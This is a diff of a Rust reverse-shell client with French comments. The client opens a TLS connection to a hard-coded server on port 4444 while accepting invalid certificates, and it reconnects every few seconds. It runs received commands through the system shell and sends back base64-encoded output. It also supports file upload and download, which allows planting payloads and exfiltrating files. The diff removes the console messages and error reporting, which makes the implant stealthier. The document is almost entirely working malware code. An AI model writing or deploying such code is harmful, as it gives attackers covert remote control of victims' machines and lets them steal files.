@@ -6,31 +6,23 @@ use std::{env, fs};
 use native_tls::TlsConnector;
 use base64::{Engine as _, engine::general_purpose};
 
-// --- CONFIGURATION ---
-// Pense à remettre l'IP de ton serveur Exegol ici !
-const SERVER_IP: &str = "127.0.0.1"; 
+const SERVER_IP: &str = "127.0.0.1";
 const SERVER_PORT: &str = "4444";
 
 fn main() {
-    println!("Démarrage du client Remote Shell...");
-
-    let connector = TlsConnector::builder()
+    let connector = match TlsConnector::builder()
         .danger_accept_invalid_certs(true) 
-        .build()
-        .unwrap();
+        .build() 
+    {
+        Ok(c) => c,
+        Err(_) => return, 
+    };
 
-    // Boucle de reconnexion automatique
     loop {
         match TcpStream::connect(format!("{}:{}", SERVER_IP, SERVER_PORT)) {
             Ok(stream) => {
-                println!("Connecté à {}:{}", SERVER_IP, SERVER_PORT);
-                
                 match connector.connect(SERVER_IP, stream) {
                     Ok(stream) => {
-                        println!("Tunnel TLS sécurisé établi.");
-                        
-                        // CORRECTION ICI : On ne clone plus !
-                        // On donne le stream au BufReader, il en devient propriétaire.
                         let mut reader = BufReader::new(stream);
                         let mut buffer = String::new();
 
@@ -38,31 +30,30 @@ fn main() {
                             buffer.clear();
                             match reader.read_line(&mut buffer) {
                                 Ok(n) => {
-                                    if n == 0 { break; } // Serveur déconnecté
+                                    if n == 0 { break; }
                                     
                                     let cmd_line = buffer.trim().to_string();
-                                    
-                                    // CORRECTION ICI : L'ASTUCE DU GET_MUT()
-                                    // On demande au reader de nous prêter le stream pour écrire la réponse
+                                
                                     let output_stream = reader.get_mut();
                                     
                                     process_command(cmd_line, output_stream);
                                 }
-                                Err(e) => {
-                                    eprintln!("Erreur lecture: {}", e);
-                                    break;
-                                }
+                                Err(_) => break, 
                             }
                         }
                     },
-                    Err(e) => eprintln!("Erreur Handshake TLS: {}", e),
+                    Err(_) => {
+                        // Echec handshake
+                    }
                 }
             },
             Err(_) => {
-                // On attend 5 secondes avant de réessayer
-                std::thread::sleep(std::time::Duration::from_secs(5));
+                // Serveur injoignable
             }
         }
+
+        // Attente avant reconnexion (5s)
+        std::thread::sleep(std::time::Duration::from_secs(5));
     }
 }
 
@@ -77,66 +68,66 @@ fn process_command(cmd_line: String, stream: &mut native_tls::TlsStream<TcpStrea
         "cd" => {
             let new_dir = if args.is_empty() { "/" } else { args[0] };
             let root = Path::new(new_dir);
-            let msg;
-            if let Err(e) = env::set_current_dir(&root) {
-                msg = format!("Erreur CD: {}", e);
-            } else {
-                msg = "Repertoire change.".to_string();
-            }
-            let b64 = general_purpose::STANDARD.encode(msg);
-            let _ = stream.write_all(format!("{}\n", b64).as_bytes());
+            let msg = match env::set_current_dir(&root) {
+                Ok(_) => "Repertoire change.".to_string(),
+                Err(e) => format!("Erreur CD: {}", e),
+            };
+            send_response(stream, msg);
         },
         "upload" => {
+            // Syntaxe reçue: upload <BASE64> <NOM>
             if args.len() >= 2 {
                 let b64_data = args[0];
                 let filename = args[1];
 
-                let msg;
-                match general_purpose::STANDARD.decode(b64_data) {
+                let msg = match general_purpose::STANDARD.decode(b64_data) {
                     Ok(bytes) => {
-                        if let Err(e) = fs::write(filename, bytes) {
-                            msg = format!("Erreur écriture disque: {}", e);
-                        } else {
-                            msg = "Succes: Fichier uploade.".to_string();
+                        match fs::write(filename, bytes) {
+                            Ok(_) => "Succes: Fichier uploade.".to_string(),
+                            Err(e) => format!("Erreur écriture disque: {}", e),
                         }
                     },
-                    Err(e) => {
-                        msg = format!("Erreur décodage Base64: {}", e);
-                    }
-                }
-                let response_b64 = general_purpose::STANDARD.encode(msg);
-                let _ = stream.write_all(format!("{}\n", response_b64).as_bytes());
-
+                    Err(e) => format!("Erreur décodage Base64: {}", e),
+                };
+                send_response(stream, msg);
             } else {
-                 let err = general_purpose::STANDARD.encode("Erreur protocole upload.");
-                 let _ = stream.write_all(format!("{}\n", err).as_bytes());
+                send_response(stream, "Erreur protocole upload.".to_string());
             }
         },
         "download" => {
+            // Syntaxe reçue: download <NOM>
             if let Some(filename) = args.get(0) {
                 match fs::read(filename) {
                     Ok(data) => {
-                        // 1. Encodage Base64
+                        // Encodage du fichier + Envoi
                         let b64 = general_purpose::STANDARD.encode(&data);
-                        // 2. Envoi avec \n (CRUCIAL POUR DÉBLOQUER LE SERVEUR)
+                        // On utilise write_all direct ici
                         let _ = stream.write_all(format!("{}\n", b64).as_bytes());
                         let _ = stream.flush();
                     },
                     Err(e) => {
+                        // Envoi de l'erreur (encodée en Base64 pour que le serveur la lise proprement)
                         let error_msg = format!("ERROR: Impossible de lire '{}': {}", filename, e);
-                        let b64_err = general_purpose::STANDARD.encode(error_msg);
-                        let _ = stream.write_all(format!("{}\n", b64_err).as_bytes());
+                        send_response(stream, error_msg);
                     }
                 }
             }
         },
         "exit" => {
+            // On essaie d'envoyer un dernier message, puis on quitte
+            let _ = stream.write_all(b"Au revoir.\n"); 
             std::process::exit(0);
         },
         _ => {
             execute_os_command(command, args, stream);
         }
     }
+}
+
+// Helper pour encoder en Base64 et envoyer avec \n
+fn send_response(stream: &mut native_tls::TlsStream<TcpStream>, msg: String) {
+    let b64 = general_purpose::STANDARD.encode(msg);
+    let _ = stream.write_all(format!("{}\n", b64).as_bytes());
 }
 
 fn execute_os_command(cmd: &str, args: &[&str], stream: &mut native_tls::TlsStream<TcpStream>) {
@@ -155,18 +146,19 @@ fn execute_os_command(cmd: &str, args: &[&str], stream: &mut native_tls::TlsStre
     match Command::new(shell).args(&[flag, &full_cmd]).output() {
         Ok(output) => {
             let mut response_bytes = output.stdout;
+            // On ajoute stderr si présent
             if !output.stderr.is_empty() {
                 response_bytes.extend_from_slice(b"\n--- STDERR ---\n");
                 response_bytes.extend(output.stderr);
             }
 
+            // Encodage Base64 pour éviter problèmes d'accents/multilignes
             let b64_response = general_purpose::STANDARD.encode(&response_bytes);
             let _ = stream.write_all(format!("{}\n", b64_response).as_bytes());
         },
         Err(e) => {
             let error_msg = format!("Impossible d'exécuter: {}", e);
-            let b64_error = general_purpose::STANDARD.encode(error_msg);
-            let _ = stream.write_all(format!("{}\n", b64_error).as_bytes());
+            send_response(stream, error_msg);
         }
     }
 }
